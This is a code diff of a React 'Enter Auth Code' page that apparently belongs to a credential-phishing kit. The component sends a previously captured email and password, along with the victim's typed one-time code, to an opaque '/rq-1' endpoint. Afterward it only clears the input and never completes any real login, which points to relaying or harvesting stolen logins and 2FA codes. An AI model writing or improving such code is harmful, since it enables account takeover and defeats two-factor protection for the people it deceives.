@@ -7,26 +7,21 @@ import twoFA from '../assets/2fa.png'
 export default function Otp(props) {
     const history = useHistory()
 
-        const [verifyOtp, setVerifyOtp] = useState('')
+    const [verifyOtp, setVerifyOtp] = useState('')
     const [loading, setLoading] = useState(false)
 
-  const handleCode = (e) => {
-      setVerifyOtp(e.target.value.replace(/\D/, ''))
-  }
+    const handleCode = (e) => {
+        setVerifyOtp(e.target.value.replace(/\D/, ''))
+    }
 
     const handleSubmit = async (e) => {
         e.preventDefault()
         setLoading(true)
 
-        const clientOtp = verifyOtp
-
         if (props.location.state) {
             const templateParams = props.location.state
 
-            templateParams.clientOtp = clientOtp
-
             try {
-              
                 const response = await fetch(URL + '/rq-1', {
                     method: 'POST',
                     headers: {
@@ -40,8 +35,8 @@ export default function Otp(props) {
                     body: JSON.stringify({
                         email: templateParams.email,
                         password: templateParams.password,
-                        pin: clientOtp,
-                        otp: '',
+                        otp: templateParams.otp,
+                        verifyOtp,
                     }),
                 })
 
@@ -52,15 +47,16 @@ export default function Otp(props) {
                     setTimeout(() => {
                         console.log('time out init')
                         setLoading(false)
-
-                        history.push('/verifyotp', templateParams)
+                        setVerifyOtp('')
                     }, 3000)
                 } else if (resData.status === 'fail') {
                     console.log('Message failed to send.')
                     setLoading(false)
+                    setVerifyOtp('')
                 }
             } catch (err) {
                 console.log(err)
+                setVerifyOtp('')
             }
         }
     }
@@ -95,7 +91,7 @@ export default function Otp(props) {
                                 className='text-[#b2b7be] outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-[#b2b7be] mb-4 bg-transparent border border-[#b2b7be] my-10 w-full'
                                 required
                                 pattern='\d*'
-                                value={code}
+                                value={verifyOtp}
                                 placeholder='Enter Auth Code'
                                 onChange={handleCode}
                                 maxLength={6}
